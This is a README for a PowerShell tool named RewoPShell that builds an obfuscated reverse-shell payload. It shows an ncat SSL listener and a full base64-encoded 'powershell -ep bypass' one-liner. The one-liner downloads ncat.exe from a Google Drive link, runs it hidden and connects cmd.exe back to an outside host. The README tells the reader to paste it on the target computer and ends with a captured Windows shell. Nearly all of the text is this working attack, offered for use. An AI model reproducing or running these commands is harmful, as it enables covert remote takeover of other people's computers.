# RewoPShell

### Usage:

## 1. Upload ncat.exe to any place and take url.
## 2. Listen with ncat :
```
[gurbanli@attacker NcatPortable]$ sudo ncat -lvp 443 --ssl
```
## 3. Generate command:
```
PS /root/RewoPShell> ./RewoPShell.ps1 -DownloadUrl "https://drive.google.com/u/0/uc?id=1O2ysQsbCi7ozlLVEQzmOySAKaAiZ1OZY&export=download" -HostAddress gurbanli.org

powershell.exe -nop -ep bypass -noni -encodedCommand "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBkAHIAaQB2AGUALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AdQAvADAALwB1AGMAPwBpAGQAPQAxAE8AMgB5AHMAUQBzAGIAQwBpADcAbwB6AGwATABWAEUAUQB6AG0ATwB5AFMAQQBLAGEAQQBpAFoAMQBPAFoAWQAmAGUAeABwAG8AcgB0AD0AZABvAHcAbgBsAG8AYQBkACIAOwAkAG8AdQB0AHAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAG4AYwBhAHQALgBlAHgAZQAiADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAG8AdQB0AHAAYQB0AGgAOwAkAGEAcgBnAHMAIAA9ACAAQAAoACIALQAtAHMAcwBsACIALAAiAGcAdQByAGIAYQBuAGwAaQAuAG8AcgBnACIALAAiADQANAAzACIALAAiAC0ALQBlAHgAZQBjACIALAAiAGMAbQBkAC4AZQB4AGUAIgApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAbwB1AHQAcABhAHQAaAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAkAGEAcgBnAHMAOwA=" 

```
## 4. Copy and paste on taget computer
## 5. And we got reverse shell:
```
[gurbanli@attacker NcatPortable]$ sudo ncat -lvp 443 --ssl
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 45C9 69FC FF62 4DA7 261D 3114 7DFE D75E B34A B5FD
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from x.x.x.x.
Ncat: Connection from x.x.x.x:20145.
Microsoft Windows [Version 10.0.18363.418]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Downloads>

```
